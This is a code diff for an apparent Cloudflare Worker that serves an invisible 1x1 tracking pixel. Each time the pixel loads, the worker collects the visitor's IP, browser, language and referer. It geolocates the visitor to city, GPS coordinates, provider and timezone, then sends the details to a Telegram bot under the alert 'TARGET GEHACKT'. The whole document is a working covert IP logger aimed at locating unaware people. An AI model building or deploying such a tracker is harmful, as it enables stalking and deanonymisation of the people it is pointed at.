@@ -4,37 +4,50 @@ export default {
 
     if (url.pathname === "/pixel") {
       const ip = request.headers.get("CF-Connecting-IP") || "unknown";
-      const ua = request.headers.get("User-Agent") || "";
-      const tag = url.searchParams.get("c") || "";
+      const ua = request.headers.get("User-Agent") || "unknown";
+      const lang = request.headers.get("Accept-Language") || "unknown";
+      const ref = request.headers.get("Referer") || "Direkt";
+      const tag = url.searchParams.get("c") || "unbekannt";
       const t = new Date().toISOString();
 
-      // 1. Geo-Infos abrufen (Stadt, Land, Provider)
-      let geoInfo = "Unbekannt";
-      try {
-        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org`);
-        const geo = await geoRes.json();
-        if (geo.status === "success") {
-          geoInfo = `${geo.city || '?'}, ${geo.country || '?'} | ${geo.isp || geo.org || '?'}`;
-        }
-      } catch (e) {
-        geoInfo = "API Fehler";
-      }
+      let loc = "Unbekannt", isp = "Unbekannt", asn = "Unbekannt", timezone = "Unbekannt";
+      let lat = "?", lon = "?";
 
-      // 2. In KV speichern
       try {
-        if (env.HITS) {
-          await env.HITS.put(Date.now() + "-" + ip, JSON.stringify({ ip, ua, tag, t, geoInfo }));
+        // Detaillierte API-Abfrage
+        const res = await fetch(`https://ipwho.is/${ip}`);
+        const data = await res.json();
+        
+        if (data.success) {
+          loc = `${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}`;
+          isp = data.connection?.isp || "?";
+          asn = `AS${data.connection?.asn || '?'} (${data.connection?.org || '?'})`;
+          timezone = data.timezone?.id || "?";
+          lat = data.latitude || "?";
+          lon = data.longitude || "?";
         }
       } catch (e) {}
 
-      // 3. An Telegram senden
+      // In KV speichern
+      try {
+        if (env.HITS) {
+          await env.HITS.put(Date.now() + "-" + ip, JSON.stringify({ ip, ua, tag, t, loc, isp }));
+        }
+      } catch (e) {}
+
       if (env.BOT_TOKEN && env.CHAT_ID) {
         const msg = 
-          `🎯 **Neuer Hit!**\n` +
-          `🏷️ **Tag:** ${tag || "-"}\n` +
-          `🌐 **IP:** ${ip}\n` +
-          `📍 **Ort:** ${geoInfo}\n` +
-          `📱 **Device:** ${ua.slice(0, 80)}...\n` +
+          `🚨 **TARGET GEHACKT** 🚨\n` +
+          `🏷️ **Tag:** ${tag}\n` +
+          `🌐 **IP:** \`${ip}\`\n` +
+          `📍 **Ort:** ${loc}\n` +
+          `🗺️ **GPS:** ${lat}, ${lon}\n` +
+          `📡 **Provider:** ${isp}\n` +
+          `🏢 **ASN:** ${asn}\n` +
+          `🕒 **Zeitzone:** ${timezone}\n` +
+          `🗣️ **Sprache:** ${lang}\n` +
+          `🔗 **Referer:** ${ref}\n` +
+          `📱 **Device:** \`${ua}\`\n` +
           `⏰ **Zeit:** ${t}`;
 
         try {
@@ -50,7 +63,6 @@ export default {
         } catch (e) {}
       }
 
-      // 4. Unsichtbares Bild zurückgeben
       const gif = Uint8Array.from(atob("R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=="), c => c.charCodeAt(0));
       return new Response(gif, { headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" } });
     }
